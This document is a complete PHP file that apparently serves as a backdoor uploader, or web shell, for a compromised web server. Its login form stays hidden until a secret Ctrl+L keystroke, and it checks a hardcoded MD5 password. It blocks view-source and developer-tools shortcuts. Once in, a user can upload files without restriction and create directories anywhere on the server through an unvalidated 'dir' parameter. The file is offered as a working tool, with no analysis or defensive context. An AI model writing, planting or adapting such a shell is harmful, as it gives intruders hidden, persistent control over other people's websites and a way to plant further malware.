<?php
session_start(); // Start the session to store messages

// Hardcoded credentials
$validPasswordHash = 'd8ae95d68a715111d69902895cd874de'; // MD5 hash of the password

// Function to check the credentials
function checkCredentials($inputPassword) {
    global $validPasswordHash;
    $inputPasswordHash = md5($inputPassword); // Hash the input password
    return $inputPasswordHash === $validPasswordHash; // Return true if the credentials match
}

// Check if the user is logged in
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $passwordInput = $_POST['password'];

        if (checkCredentials($passwordInput)) {
            $_SESSION['logged_in'] = true; // Set session variable to indicate the user is logged in
        } else {
            $message = "Incorrect password.";
        }
    }
}

// If the user is not logged in, show the login form
if (!isset($_SESSION['logged_in'])) {
    ?>
    <form action="" method="post" id="loginForm" style="display: none;">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
    <p id="message" style="color: red;"><?php if (isset($message)) echo $message; ?></p>
    <script>
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && event.key === 'l') { // Change to Ctrl + L
                event.preventDefault(); // Prevent the default action
                document.getElementById('loginForm').style.display = 'block'; // Show the login form
                document.getElementById('password').focus(); // Focus on the password input
            }
        });

        // Prevent Ctrl + U
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
                event.preventDefault(); // Prevent the default action
                alert("Fungsi ini dinonaktifkan.");
            }
        });

        // Prevent F12 (Inspect Element)
        document.addEventListener('keydown', function(event) {
            if (event.keyCode === 123) {
                event.preventDefault(); // Prevent the default action
            }
        });

        // Prevent Ctrl + Shift + I
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && event.shiftKey && event.key === 'I') {
                event.preventDefault(); // Prevent the default action
            }
        });

        // Prevent Ctrl + Shift + J
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && event.shiftKey && event.key === 'J') {
                event.preventDefault(); // Prevent the default action
            }
        });
    </script>
    <?php
    exit; // Exit the script if the user is not logged in
}

// Function to handle file uploads
function handleFileUpload($targetDir) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
                $tmpName = $_FILES['file']['tmp_name'];
        $name = basename($_FILES['file']['name']);
        $targetFile = $targetDir . '/' . $name;

        // Move the uploaded file
        if (move_uploaded_file($tmpName, $targetFile)) {
            return "File uploaded successfully: " . htmlspecialchars($name) . " to " . htmlspecialchars($targetFile);
        } else {
            return "Failed to move uploaded file.";
        }
    }
    return "No file uploaded or there was an upload error.";
}

// Function to list directories and files
function listDirectories($dir) {
    $items = scandir($dir);
    $dirList = [];
    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..' && is_dir($dir . '/' . $item)) {
            $dirList[] = htmlspecialchars($item);
        }
    }
    return $dirList;
}

// Function to create a new directory
function createDirectory($dir) {
    if (isset($_POST['new_dir_name']) && !empty($_POST['new_dir_name'])) {
        $newDir = $dir . '/' . basename($_POST['new_dir_name']);
        if (!file_exists($newDir)) {
            if (mkdir($newDir)) {
                return "Directory created successfully: " . htmlspecialchars($newDir);
            } else {
                return "Failed to create directory.";
            }
        } else {
            return "Directory already exists.";
        }
    }
    return "";
}

// Handle form submissions
$uploadMessage = '';
$createDirMessage = '';
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // Get the current working directory

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['upload'])) {
        $uploadMessage = handleFileUpload($currentDir);
    } elseif (isset($_POST['create_dir'])) {
        $createDirMessage = createDirectory($currentDir);
    }
}

$directories = listDirectories($currentDir); // List directories in the current directory

// Create an array of directory parts for breadcrumb navigation
$dirParts = explode('/', $currentDir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload</title>
    <style>
        body {
            background-color: #f0f0f0;
            color: #333;
            text-align: center;
        }
        .highlight {
            color: #28a745;
        }
        .file-link {
            color: #007bff;
            cursor: pointer;
        }
        .breadcrumb {
            margin: 10px 0;
        }
        .breadcrumb a {
            margin: 0 5px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <hr>
    <form action="" method="post" enctype="multipart/form-data">
        <p>
            <strong>Current Directory:</strong>
            <span class="breadcrumb">
                <?php
                $path = '';
                foreach ($dirParts as $part) {
                    if ($part !== '') {
                        $path .= '/' . $part;
                        echo "<a href='?dir=" . urlencode($path) . "' class='file-link'>" . htmlspecialchars($part) . "</a>";
                    }
                }
                ?>
            </span>
            <a href='?dir=<?php echo urlencode(getcwd()); ?>' class='file-link'>Home</a>
        </p>
        <input type="file" name="file" size="45">
        <input name="upload" type="submit" value="Upload">
    </form>
    <hr>

    <form action="" method="post">
        <input type="text" name="new_dir_name" placeholder="New Directory Name" required>
        <input name="create_dir" type="submit" value="Create Directory">
    </form>
    <hr>

    <?php
    // Display upload message
    if (!empty($uploadMessage)) {
        echo "<div class='highlight'>$uploadMessage</div>";
    }

    // Display create directory message
    if (!empty($createDirMessage)) {
        echo "<div class='highlight'>$createDirMessage</div>";
    }

    // Display list of directories
    echo "<div class='highlight'>Directories:</div><ul>";
    foreach ($directories as $directory) {
        echo "<li><a href='?dir=" . urlencode($currentDir . '/' . $directory) . "' class='file-link'>" . $directory . "</a></li>";
    }
    echo "</ul>";
    ?>

</body>
</html>
